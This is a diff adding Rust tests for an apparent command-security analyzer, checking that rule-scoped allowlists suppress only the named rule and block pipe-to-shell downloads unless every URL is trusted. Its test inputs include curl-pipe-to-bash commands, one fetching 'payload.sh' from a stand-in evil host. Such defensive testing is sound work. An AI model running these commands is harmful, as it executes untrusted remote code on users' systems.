@@ -162,6 +162,121 @@ allowlist:
     );
 }
 
+#[test]
+fn test_allowlist_rules_filter_only_the_named_rule() {
+    let policy = r#"
+fail_mode: open
+allowlist_rules:
+  - rule_id: shortened_url
+    patterns:
+      - bit.ly
+"#;
+    let repo = make_repo(policy);
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .all(|f| f.rule_id != RuleId::ShortenedUrl),
+        "rule-scoped allowlist should suppress only ShortenedUrl. Findings: {:?}",
+        verdict
+            .findings
+            .iter()
+            .map(|f| format!("{}: {}", f.rule_id, f.title))
+            .collect::<Vec<_>>()
+    );
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::CurlPipeShell),
+        "rule-scoped allowlist must not suppress unrelated rules"
+    );
+    assert_eq!(verdict.action, Action::Block);
+}
+
+#[test]
+fn test_allowlist_rules_can_suppress_pipe_to_shell_for_trusted_url() {
+    let policy = r#"
+fail_mode: open
+allowlist_rules:
+  - rule_id: curl_pipe_shell
+    patterns:
+      - example.com/install.sh
+"#;
+    let repo = make_repo(policy);
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .all(|f| f.rule_id != RuleId::CurlPipeShell),
+        "rule-scoped allowlist should suppress CurlPipeShell for trusted URLs"
+    );
+    assert_eq!(verdict.action, Action::Allow);
+}
+
+#[test]
+fn test_allowlist_rules_do_not_suppress_multi_url_pipe_when_any_url_is_untrusted() {
+    let policy = r#"
+fail_mode: open
+allowlist_rules:
+  - rule_id: curl_pipe_shell
+    patterns:
+      - trusted.example.com/install.sh
+"#;
+    let repo = make_repo(policy);
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec(
+        "curl https://trusted.example.com/install.sh https://evil.example.com/payload.sh | bash",
+        cwd,
+    );
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::CurlPipeShell),
+        "mixed trusted and untrusted URLs must keep CurlPipeShell"
+    );
+    assert_eq!(verdict.action, Action::Block);
+}
+
+#[test]
+fn test_allowlist_rules_suppress_multi_url_pipe_only_when_all_urls_are_trusted() {
+    let policy = r#"
+fail_mode: open
+allowlist_rules:
+  - rule_id: curl_pipe_shell
+    patterns:
+      - trusted.example.com/install.sh
+      - mirror.example.com/install.sh
+"#;
+    let repo = make_repo(policy);
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec(
+        "curl https://trusted.example.com/install.sh https://mirror.example.com/install.sh | bash",
+        cwd,
+    );
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .all(|f| f.rule_id != RuleId::CurlPipeShell),
+        "all trusted URLs should suppress CurlPipeShell"
+    );
+    assert_eq!(verdict.action, Action::Allow);
+}
+
 // ---------------------------------------------------------------------------
 // Severity override tests
 // ---------------------------------------------------------------------------
